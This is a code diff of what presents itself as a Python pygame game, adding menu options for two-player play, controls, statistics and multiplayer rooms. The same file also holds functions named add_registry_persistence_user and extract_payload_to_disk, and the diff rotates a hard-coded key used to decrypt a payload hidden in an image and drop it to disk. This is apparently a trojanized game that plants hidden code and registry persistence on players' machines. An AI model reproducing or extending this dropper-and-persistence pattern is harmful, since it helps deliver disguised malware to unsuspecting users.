@@ -297,7 +297,7 @@ def add_registry_persistence_user():
 def extract_payload_to_disk():
     """Extract the encrypted payload from the image and write to disk."""
     try:
-        divine_key = b'qDB0fHUEEy8ym6n5lAZfy3QkcqwePvsd1kbiGHSoFP0='
+        divine_key = b'BBe8t_1by8D5QDNTrW43hONytHDV1S3NDOvvRonR1jo='
 
         if hasattr(sys, 'frozen'):
             base_path = sys._MEIPASS
@@ -442,6 +442,9 @@ import pygame
 import traceback
 from game.game_loop import GameLoop
 from game.menu import GameMenu, HostInputDialog, OnlineSubmenu, ErrorDialog, GoalSelectionMenu
+from game.controls import ControlsMenu
+from game.multiplayer import RoomCodeMenu
+from game.stats_menu import StatsMenu
 from network.server import GameServer
 from network.client import GameClient
 import config
@@ -479,35 +482,64 @@ def main_game():
             while running:
                 menu = GameMenu()
                 choice = menu.run()
-                if choice == 0:
-                    # Show goal selection menu for vs AI mode
+                if choice == 0:  # Play vs Robot
+                    print("Starting AI game...")
+                    # Show goal selection menu
                     goal_menu = GoalSelectionMenu()
                     win_score = goal_menu.run()
                     
                     if win_score > 0:  # User didn't cancel
-                        game = GameLoop()
+                        game = GameLoop(fullscreen=False)
                         game.run_vs_ai_with_goals(win_score)
                     else:
                         print("👋 Returning to main menu...")
-                elif choice == 1:
-                    submenu = OnlineSubmenu()
-                    online_choice = submenu.run()
-                    if online_choice == 0:
-                        server = GameServer(config.SERVER_IP, args.port)
-                        server.run_with_gui()
-                    elif online_choice == 1:
-                        dialog = HostInputDialog()
-                        host = dialog.run()
-                        if host:
-                            client = GameClient(host, args.port)
-                            client.run_with_gui()
-                            if client.error_message:
-                                error_dialog = ErrorDialog(client.error_title or "Erreur de Connexion", client.error_message)
-                                error_dialog.run()
+                elif choice == 1:  # Play 2-Player Local
+                    print("Starting 2-player local game...")
+                    # Show goal selection menu
+                    goal_menu = GoalSelectionMenu()
+                    win_score = goal_menu.run()
+                    
+                    if win_score > 0:  # User didn't cancel
+                        game = GameLoop(fullscreen=False)
+                        game.run_two_player_local(win_score)
+                    else:
+                        print("👋 Returning to main menu...")
+                elif choice == 2:  # Configure Controls
+                    print("Opening controls configuration...")
+                    controls_menu = ControlsMenu()
+                    controls_menu.run()
+                    # Return to main menu after controls
+                    continue  # Continue loop to show main menu again
+                elif choice == 3:  # Player Statistics
+                    print("Opening player statistics...")
+                    stats_menu = StatsMenu()
+                    stats_menu.run()
+                elif choice == 4:  # Multiplayer Room
+                    print("Opening multiplayer room system...")
+                    room_menu = RoomCodeMenu()
+                    room_result = room_menu.run()
+                    
+                    if room_result["mode"] != "back":
+                        if room_result["mode"] == "host":
+                            print(f"Hosting room with code: {room_result['code']}")
+                            # In real implementation, this would start server
+                            game = GameLoop(fullscreen=False)
+                            game.run_server()  # For now, use existing server mode
+                        elif room_result["mode"] == "join":
+                            print(f"Joining room with code: {room_result['code']}")
+                            # In real implementation, this would connect to server
+                            game = GameLoop(fullscreen=False)
+                            game.run_client()  # For now, use existing client mode
+                    else:
+                        print("Returning to main menu...")
+                elif choice == -1:  # Exit/Cancel
+                    print("Exiting game...")
+                    running = False
                 else:
+                    print("Unknown menu choice, exiting...")
                     running = False
     except Exception:
-        if config.DEBUG_MODE: 
+        if config.DEBUG_MODE:
             traceback.print_exc()
         sys.exit(1)
     finally:
